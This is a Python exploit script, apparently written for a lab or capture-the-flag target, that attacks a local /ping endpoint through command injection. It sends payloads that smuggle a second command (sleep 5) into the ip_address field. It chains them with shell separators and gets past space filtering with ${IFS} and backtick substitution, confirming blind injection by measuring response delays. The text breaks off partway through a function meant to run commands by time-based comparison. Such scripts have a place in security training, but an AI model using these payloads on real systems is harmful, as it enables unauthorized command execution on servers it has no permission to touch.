import requests
import time
import re

# Target configuration
TARGET_URL = "http://127.0.0.1:32817/ping"
TIMEOUT = 30  # seconds

# Color codes for output
SUCCESS = "\033[92m"
WARNING = "\033[93m"
ERROR = "\033[91m"
RESET = "\033[0m"

def test_injection(payload, expected_delay=None):
    """Test command injection payload and measure response time"""
    data = {"ip_address": payload}
    
    start_time = time.time()
    try:
        response = requests.post(TARGET_URL, data=data, timeout=TIMEOUT)
        elapsed = time.time() - start_time
        return elapsed, response.status_code, response.text
    except requests.exceptions.RequestException as e:
        elapsed = time.time() - start_time
        return elapsed, None, str(e)

def test_time_delay(separator, space_bypass=" "):
    """Test various time delay techniques to confirm blind injection"""
    print(f"\n{SUCCESS}[*] Testing time delay with separator: '{separator}' and space bypass: '{repr(space_bypass)}'{RESET}")
    
    # Test sleep 5 seconds
    payloads = [
        f"1.1.1.1{separator}sleep{space_bypass}5",
        f"1.1.1.1{separator}${{IFS}}sleep${{IFS}}5",
        f"1.1.1.1{separator}$({{IFS}}sleep${{IFS}}5)",
        f"1.1.1.1{separator}`sleep{space_bypass}5`",
        f"1.1.1.1{separator}||sleep{space_bypass}5",
        f"1.1.1.1{separator}&&sleep{space_bypass}5",
    ]
    
    for payload in payloads:
        elapsed, status, response = test_injection(payload)
        print(f"  Test: {payload[:80]}...")
        print(f"    Time: {elapsed:.2f}s | Status: {status}")
        
        if elapsed >= 4.5 and elapsed <= 8:
            print(f"    {SUCCESS}[+] VULNERABILITY CONFIRMED! Delay detected ({elapsed:.2f}s > 4s){RESET}")
            return True, payload
        elif elapsed >= 3:
            print(f"    {WARNING}[?] Possible delay detected ({elapsed:.2f}s){RESET}")
    
    print(f"    {ERROR}[-] No reliable delay detected{RESET}")
    return False, None

def execute_command(exploit_pattern):
    """Execute command through blind injection using time-based comparison"""
    
    def execute_single_command(cmd, success_condition="if"):
        """Execute a single command and check if it returns success"""
        print(f"  Testing: {cmd}")
        
        # Method 1: Conditional time delay
        payload = exploit_pattern.replace("{CMD}", cmd).replace("{CONDITION}", success_condition)
        elapsed, status, response = test_injection(payload)
        
